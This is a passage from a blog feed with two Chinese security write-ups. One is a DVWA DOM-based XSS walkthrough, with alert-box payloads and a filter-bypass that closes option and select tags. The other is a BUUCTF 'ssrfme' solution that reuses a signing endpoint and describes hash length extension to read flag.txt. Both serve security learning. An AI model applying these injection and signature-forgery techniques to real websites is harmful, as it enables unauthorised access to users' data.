class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:message&#x27;</span>, <span class="variable">$message</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:name&#x27;</span>, <span class="variable">$name</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>好，这波name也用了htmlspecialchars，合理。但是要注意的是，如果htmlspecialchars函数使用不当，攻击者就可以通过编码的方式绕过函数进行XSS注入，这个具体看其他博客吧，也是我仍然需要学习的知识。</p><h1 id="DVWA之DOM型XSS"><a href="#DVWA之DOM型XSS" class="headerlink" title="DVWA之DOM型XSS"></a>DVWA之DOM型XSS</h1><h2 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h2><p>在选了English之后，会发现url里有一个？default=English，于是我们把English改为<code>&lt;script&gt;alert(&#39;123&#39;)&lt;/script&gt;</code>，在访问时可以看到确实被执行了。<br><img src="/2021/03/11/XSS/7.jpg" alt><br>查看源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># No protections, anything goes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>就说了句无防备……</p><h2 id="medium-2"><a href="#medium-2" class="headerlink" title="medium"></a>medium</h2><p>尝试和low一样的操作，发现不行，于是尝试双写和大小写绕过，发现也并不行。<br>于是尝试用onerror绕过，输入<code>&lt;img src=&quot;&quot; onerror=alert(&quot;123&quot;)&gt;</code>发现也不行。<br>晕了，看下源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !is_null (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">    <span class="variable">$default</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (stripos (<span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里用了一个stripos，查找字符串在另一字符串中第一次出现的位置，如果有就为true，即就不等于false，就会执行<br><code>header (&quot;location: ?default=English&quot;);</code><br>也就是说第一步的想法是正确的，要用onerror绕过。<br><img src="/2021/03/11/XSS/8.jpg" alt><br>可以看到，我们的img已经插入了html，但是只是一个value罢了。<br>于是我们尝试闭合option标签，输入<code>&lt;/option&gt;&lt;img src=&quot;&quot; onerror=alert(&quot;123&quot;)&gt;</code><br>发现还是不行，原来此时img还在&lt;select&gt;标签，于是再把select标签页闭合了<br><code>&lt;/option&gt;&lt;/select&gt;&lt;img src=&quot;&quot; onerror=alert(&quot;123&quot;)&gt;</code><br><img src="/2021/03/11/XSS/9.jpg" alt></p><h2 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !is_null (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the allowable languages</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>意思是default参数必须是这几个之一。<br>这里不太会，去抄答案了。<br><a href="https://www.jianshu.com/p/001daa7cf1f5">https://www.jianshu.com/p/001daa7cf1f5</a><br><code>?default=English #&lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br>由于 form表单提交的数据 想经过JS 过滤 所以注释部分的javascript 代码 不会被传到服务器端(也就符合了白名单的要求)</p><h2 id="impossible-2"><a href="#impossible-2" class="headerlink" title="impossible"></a>impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Don&#x27;t need to do anything, protction handled on the client side</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到前端变成了</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;XSS&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;default&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span> (<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">var</span> lang = <span class="built_in">document</span>.location.href.substring(<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span></span><br><span class="line"><span class="javascript">                        <span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + (lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="handlebars"><span class="xml">                        document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">disabled</span>=<span class="string">&#x27;disabled&#x27;</span>&gt;</span>----<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line">                    &#125;</span><br><span class="line">                        </span><br><span class="line"><span class="handlebars"><span class="xml">                    document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;English&#x27;</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;French&#x27;</span>&gt;</span>French<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;Spanish&#x27;</span>&gt;</span>Spanish<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;German&#x27;</span>&gt;</span>German<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Select&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里用另一个js脚本，将我们赋给default的值赋给option，而浏览器会将这些值进行url编码，因此就可以防止注入。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>其实在刚开始用dvwa了解xss漏洞的时候，我一直不太理解这漏洞到底能造成什么危害，因为说到底各式各样的解都只是POC罢了，也没有利用，直到后来看到了一些真正恶意的js才终于明白js也能是很恶意的东西，比如这篇文章。<br><a href="https://cloud.tencent.com/developer/article/1038173?from=information.detail.js%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%9C%89%E5%93%AA%E4%BA%9B">https://cloud.tencent.com/developer/article/1038173?from=information.detail.js%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%9C%89%E5%93%AA%E4%BA%9B</a><br>给我的收获是，学习网络安全不能只看poc，一定要看看exp，甚至亲自去操作一些exp实践，才能真正的理解、掌握相应的技巧</p><p>参考：<br><a href="https://www.jianshu.com/p/001daa7cf1f5">https://www.jianshu.com/p/001daa7cf1f5</a><br><a href="http://blog.nsfocus.net/xss-advance/">http://blog.nsfocus.net/xss-advance/</a><br><a href="https://baike.baidu.com/item/XSS%E6%94%BB%E5%87%BB/954065?fr=aladdin">https://baike.baidu.com/item/XSS%E6%94%BB%E5%87%BB/954065?fr=aladdin</a><br><a href="https://blog.csdn.net/lay_loge/article/details/90440207">https://blog.csdn.net/lay_loge/article/details/90440207</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ssrfme</title>
    <link href="https://blog.pillar.fun/2021/03/09/ssrfme/"/>
    <id>https://blog.pillar.fun/2021/03/09/ssrfme/</id>
    <published>2021-03-09T10:45:56.000Z</published>
    <updated>2021-03-10T05:14:19.583Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>题源BUUCTF</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>直接访问就是源码，且题目源码也在github上了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>可以看到是一个flask应用，且有三个路由，分别是geneSign、De1ta和默认。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br></pre></td></tr></table></figure><p>其中，De1ta路由从参数和cookie中接收了action、param和sign，并且用这些参数生成一个task类，然后返回了task.Exec()生成的result的json。</p><p>由此我们先分析Exec</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">    <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">            resp = scan(self.param)</span><br><span class="line">            <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> resp</span><br><span class="line">                tmpfile.write(resp)</span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>如果checkSign方法返回值为真，那么看action参数中的内容，如果包含”scan”，那么就打开./sandbox/result.txt，然后调用scan函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br></pre></td></tr></table></figure><p>用urlopen打开param，并读取前50字节内容，并写入result.txt。</p><p>如果包含”read”那么就打开./sandbox/result.txt，并将其中的内容写入回应包的data部分</p><p>由此，我们只需实现让action包含有scan，利用param控制向result.txt写入我我们想要的内容<br>同时action也包含read，使我们能够读取上一步或得到的东西。</p><p>因此，我们需要实现的东西有以下几点</p><ol><li>self.checkSign()为true</li><li>action中包含read和scan</li><li>让param设置为flag所在的位置</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>于是去看getSign</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure><p>可以看到，getSign的返回值是secert_key + param + action的md5值，也就是说，我们要让sign等于这个值。<br>其中，secert_key是一个16位随机数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br></pre></td></tr></table></figure><p>走到这里似乎就卡住了，于是我们再去看看geneSign（看名字就知道该看这儿了）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br></pre></td></tr></table></figure><p>可以看到这里直接就调用了getSign函数，且接受的参数action定死为”scan”，param可由我们控制。<br>结合getSign，我们这里可以得到<br>secert_key + param + “scan”的md5值，因此我们直接让param等于想要访问的文件+”read”，即得到<br>md5（secert_key+想要访问的文件+”readscan”)<br>而在De1ta时，我们让param等于想要访问的文件，让action等于readscan，此时调用getSign为<br>md5（secert_key+想要访问的文件+”readscan”)，恰好为上一步我们在geneSign页面可以获取的内容</p><p>提示有说，flag在flag.txt之中，所以我们先去geneSign，让param为flag.txtread得到sign<br><img src="/2021/03/09/ssrfme/1.jpg" alt><br>然后在访问De1ta，用cookie传sign和action，用param传flag.txt，用即得到flag。<br><img src="/2021/03/09/ssrfme/2.jpg" alt></p><h1 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h1><p>看了官方解答，使用到了hashpumpy，利用哈希长度拓展攻击<br>哈希长度拓展攻击可以在不知道salt的具体内容的情况下，计算出任意的md5(salt+message+padding+append)值<br>对本题，即通过md5(secert_key + ‘flag.txt’ + ‘scan’) 的值延拓成 md5(secert_key + ‘flag.txt’ + ‘scan’ + ‘read’) 的值</p><p>哈希长度拓展攻击的精髓就在于，哈希的下一个块的加密时利用了上一块加密的magicnumber</p><p>通过哈希算法，我们可以得知，他的基本操作是这样的：<br><img src="/2021/03/09/ssrfme/3.jpg" alt><br>首先我们有4个32位的数A=0x67452301，B=0xefcdab89，C=0x98badcfe，D=0x10325476<br>要哈希的值会被分成每块儿512位（16*32）的块儿，第一块会和ABCD进行巧妙的数学运算，得到另一组4*32的数，这一组再与第二块儿进行巧妙地数学运算，以此类推。最后得到的4*32即为md5的值<br>而当我们知道md5(salt+message)，即可得到最后一次巧妙运算的magicnumber。<br>而根据md5的算法，md5(salt+message+pedding)=md5(salt+message+pedding+append+peddingappend)（这里大家可以去自己试试）<br>因此就可以在不知道salt的情况下得到md5(salt+message+padding+append)</p><p>而hashpump就是一个包含类似功能的工具。</p><p>参考<br><a href="https://www.cnblogs.com/p00mj/p/6288337.html">https://www.cnblogs.com/p00mj/p/6288337.html</a><br><a href="https://www.cnblogs.com/chrysanthemum/p/11765046.html">https://www.cnblogs.com/chrysanthemum/p/11765046.html</a><br><a href="https://joychou.org/web/hash-length-extension-attack.html">https://joychou.org/web/hash-length-extension-attack.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>面试押题</title>
    <link href="https://blog.pillar.fun/2021/03/05/%E9%9D%A2%E8%AF%95%E6%8A%BC%E9%A2%98/"/>
    <id>https://blog.pillar.fun/2021/03/05/%E9%9D%A2%E8%AF%95%E6%8A%BC%E9%A2%98/</id>
    <published>2021-03-05T07:40:22.000Z</published>
    <updated>2021-03-10T09:29:03.363Z</updated>
    
